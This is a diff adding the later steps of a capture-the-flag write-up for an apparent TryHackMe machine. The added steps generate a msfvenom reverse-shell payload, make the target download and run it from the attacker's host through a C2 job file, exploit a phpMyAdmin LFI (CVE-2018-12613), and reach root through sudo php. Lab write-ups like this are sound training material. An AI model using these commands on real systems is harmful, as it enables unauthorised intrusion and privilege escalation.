@@ -113,5 +113,86 @@ echo $(cat 'get-job/ImxhdGVzdCI=' | base64) > 'get-job/ImxhdGVzdCI='
 ###### Congratulations🥳, You have Achieved foothold!!!
 
 Step 3:
+###### Now you probably guess what we going to do next. You probably tried a "/bin/bash" reverse shell and saw that it was being closed after the connection was made. But dont give up there are many more reverse shells out there to try. The one I used was from "msfvenom" as showen below.
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f elf > shell.elf
+```
+###### Once that is done, you run a command on the target machine using the c2 to "Download", "Set Execution Bit" and then run the shell.elf.
+```
+echo '{"job_id": 0, "cmd": "wget http://<your-ip>:<your-port>/shell.elf"}' | base64 > 'get-job/ImxhdGVzdCI='
+```
+###### Make it executable.
+```
+echo '{"job_id": 0, "cmd": "chmod +x shell.elf"}' | base64 > 'get-job/ImxhdGVzdCI='
+```
+###### Run a netcat listener.
+```
+nc -nvlp <your-revshell-port>
+```
+###### Run the shell.elf.
+```
+echo '{"job_id": 0, "cmd": "./shell.elf"}' | base64 > 'get-job/ImxhdGVzdCI='
+```
+###### Wait🐌....
+###### Niceee 😜
+![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/19faba52-9617-46d8-83aa-8e05c85648ee)
+###### Lets get a neat shell
+```
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/5c6be3d0-b480-4ba9-bc7a-28d89c610e10)
+
+
+Step 4:
+###### Before you go continue with this write-up try and find your own way to privesc. If you really start to bang your head and haven't gotten to far then come back.
+## A Few Moments Later ....
+###### Ok so to do PrivEsc you probably found the following.<br>open ports mysql(3306, 33060), http(80)<br>/var/www/html, /var/www/phpmyadmin<br>/etc/passwd contains users(ada, fi, root)<br>/home/ada has 2 scripts products.py(has the creds for mysql) and .implant/implant.py<br>/home/fi/ has sanitize.sh and sniffer.py<br>And you will notice both directories have log files.
+###### Now the interesting thing "sanitize.sh" is used only by root to clear logs and in /var/www/phpmyadmin you find db_sql.php which you notice is vulnerable to LFI.<br>You might think to yourself why....<br>If you pursue this LFI you get a RCE by poisoning the session cookie.<br>I dont know where exactly the verson of the phpmyadmin is but I portforwarded it and got a buggy version of the website in my browser and I logged in using the credentials I found. It Worked. I also found a CVE for the php application (CVE-2018-12613). Download it it helps alot for this next part.
+
+###### So we need to download the exploit onto out machine and then from our machine onto the targets machine. The following is to let the target download the exploit.
+```
+echo '{"job_id": 0, "cmd": "wget http://<your-ip>:<your-port>/exploit.py"}' | base64 > 'get-job/ImxhdGVzdCI='\
+```
+###### Listen on the port you have set your shell.elf to, to create a new session.
+```
+nc -nvlp <your-port>
+```
+###### Make sure the old shell is not running on the target.
+```
+echo '{"job_id": 0, "cmd": "pkill shell.elf"}' | base64 > 'get-job/ImxhdGVzdCI='\
+```
+###### Use it to run shell.elf
+```
+echo '{"job_id": 0, "cmd": "python3 exploit.py localhost 80 '"'""'"' <mysql-username> <mysql-password> /home/ada/shell.elf"}' | base64 > 'get-job/ImxhdGVzdCI='\
+```
+###### Nice😉
+![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/2a7db0b1-fda7-456d-8219-e5f987006b0b)
+
+Step 5:
+###### Lets try our luck with running.
+```
+sudo -l
+```
+###### 👀😲Whatttt..<br>Output:
+```
+Matching Defaults entries for www-data on forgottenimplant:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on forgottenimplant:
+    (root) NOPASSWD: /usr/bin/php
+```
+###### There are so many ways to get root with php. What I used is showen below.
+```
+sudo php -r "system('/bin/bash');"
+```
+![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/19e05a9b-2486-48b3-bb61-4f7ed3f4c7f6)
+###### And you finally Got ROOOTTT🥳🕶️
+![image](https://tryhackme-images.s3.amazonaws.com/room-icons/1968fc18c7598f797954065d05a7f8f0.png)
+
+
+
+
+
 
 
